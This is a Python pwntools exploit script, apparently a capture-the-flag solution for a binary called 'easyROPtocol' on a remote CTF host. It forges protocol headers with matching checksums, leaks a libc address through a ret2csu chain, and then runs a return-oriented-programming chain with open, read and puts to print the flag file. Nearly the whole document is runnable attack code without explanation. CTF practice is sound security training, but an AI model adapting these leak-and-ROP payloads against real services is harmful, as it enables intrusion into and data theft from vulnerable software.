# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './easyROPtocol'
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
else:
    host = 'node4.buuoj.cn'
    port = '25564'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def cmd(num):
    sla('Quit.',num)

def add(payload):
    cmd(1)
    se(payload)

def delete(idx):
    cmd(2)
    sla('Which?' , idx)

def tcphead( offset , check ):
    return p16(0x766e) + p16(0x28b7) + p32(offset) + p32(1) + p16(6) + p16(1) + p16(check) + p16(0) + p16(0xffff)+ p16(0xffff)

def csu( call_addr ,rdi , rsi , rdx):
    pop_rbx_r15_ret = 0x401BAA
    mov_call = 0x401B90
    arg = flat(
        0 , 1 , 
        rdi , rsi , rdx,
        call_addr,
    )
    return flat(pop_rbx_r15_ret , arg , mov_call) 

# one_gad = one_gadget(libc.path)

def attack():
    
    main = 0x000000000401A5E
    bss_addr = 0x404270
    free_got = elf.got['free']
    write_got = elf.got['write']
    read_got = elf.got['read']
    ret = 0x401BB4

    payload = tcphead( 1, 0x4ad5) + 'a'*0xf80

    add(payload)
    payload = tcphead( 0x1001, 0x5ad5) + 'a'*0xf80
    add(payload)
    payload = tcphead( 0x2001, 0x6ad5) + 'a'*0xf80
    add(payload)

    payload = tcphead( 0x3001, 0x62fa) + 'a'*0x1a8 
    payload += csu(write_got , 1,write_got,0x8)
    payload += '\x00'*0x38
    payload += csu(read_got , 0,bss_addr,0x8)
    payload += '\x00'*0x38
    payload += p64(0x000000000401A5E)

    cmd(1)
    se(payload)
    # dbg()
    cmd(3)

    libc.address = l64() - libc.sym['write']
    se('flag\x00')

    read_addr = libc.sym['read']
    open_addr = libc.sym['open']
    puts_addr = libc.sym['puts']
    pop_rax_ret = libc.search(asm('pop rax; ret')).next()
    pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
    pop_rsi_ret = libc.search(asm('pop rsi; ret')).next()
    pop_rdx_ret = libc.search(asm('pop rdx; ret')).next()
    pop_rdx_pop_rbx_ret = libc.search(asm('pop rdx ; pop rbx ; ret')).next()
    ret = pop_rdi_ret + 1

    flag_addr = bss_addr
    chain = flat(
        pop_rdi_ret , flag_addr , pop_rsi_ret , 0 , open_addr,
        pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , 0x100 , 0 , read_addr,
        pop_rdi_ret , flag_addr , puts_addr
    )
    # len chain 0x80
    check = 0x7ad5
    for i in range(0,len(chain) , 2):
        check ^= u16(chain[i : i+2])
        print(hex(u16(chain[i : i+2])) , hex(check))

    delete(3)
    payload = tcphead( 0x3001, check) + 'a'*0x1a8 
    payload += chain

    cmd(1)
    se('\x00'*0x1000)

    cmd(1)
    se(payload)
    cmd(3)

    # dbg()

    # # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   easyROPtocol.py
@Time    :   2022/02/12 11:07:18
@Author  :   Niyah 
'''
